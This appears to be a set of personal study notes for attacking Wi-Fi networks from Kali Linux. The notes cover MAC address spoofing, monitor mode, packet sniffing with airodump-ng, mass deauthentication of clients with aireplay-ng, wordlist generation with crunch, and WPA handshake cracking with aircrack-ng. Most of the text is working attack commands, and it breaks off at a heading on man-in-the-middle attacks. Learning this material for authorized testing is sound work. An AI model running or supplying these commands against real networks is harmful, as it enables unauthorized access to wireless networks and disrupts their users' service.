*** Fix Kali driver

sudo apt-get install firmware-iwlwifi 
sudo modprobe -r iwlwifi
sudo modprobe iwlwifi

******************
ifconfig
    list all network interface devices

ifconfig wlan0 down
    to disable the interface

ifconfig wlan0 hw ether 00:11:22:33:44:55
    to change the Mac Address
    make sure the Mac Address starts with 00
**** my original mac address: ce:68:1e:1d:f8:34

ifconfig wlan0 up
    to enable the interface

***Prevent from revert back to original Mac Address***
leafpad /etc/NetworkManager/NetworkManager.conf
    Paste the following in the config file:

    [device]
    wifi.scan-rand-mac-address=no

    [connection]
    ethernet.cloned-mac-address=preserve
    wifi.cloned-mac-address=preserve

service network-manager restart
    to restart the network manager after changing the config file


iwconfig
    to see the mode of wifi adapter

ifconfig wlan0 down

airmon-ng check kill
    to kill all process that interfere when using with wifi
    attack needs monitor mode no need the internet connection

iwconfig wlan0 mode monitor 
    to change to monitor mode

*** To capture all packets in our range

airodump-ng wlan0 
    to capture all packets


ESSID (name of the wifi)
BSSID (mac addre of target network)
PWR (strenght of signal; higher better)
Beacons (frames to broadcast its existence)
CH (chanenl)
ENC (encription)
#Data (useful packets)
#/S (numbers of data collected)
MB (maximum speed supported by network)
CIPHER (cipher use in the network)
Auth (auth used again in the nework)


*** Change Mac address with macchanger

macchanger --random wlan0
    change mac address randomly


***enable monitor mode

airmon-ng start wlan0

airmon-ng stop wlan0/mon0 
    to stop mointor mode

airmon-ng check kill 
airmon-ng start wlan0

******

Sniffing using airodump-ng 

airodump-ng --channel 2 --bssid mac-address --write file_name wlan0

*** To deauthenciate device from the network

aireplay-ng --deauth 10000 -a mac_of_target_ap -c mac_of_target  wlan0

*** Determine the name of the wifi 

airodump-ng --bssid macOfACPoint --channel 6 wlan0 

then deauth attack with 4 packets


****Cracking WPA by capture the handshake packets
after capture the handshake, create a wordlist

crunch 8 8 abcdefgh -o sample-wordlist 

then crack using aircrack-ng

sudo aircrack-ng test_sniff-08.cap -w sample-wordlist   

*** Information Gathering 

sudo netdiscover -r 192.168.1.1/24
    to see mac of devices connected to the apt

*** Use nmap/zenmap many more Information


*** Man in the middle attach => interecept the network in the middle
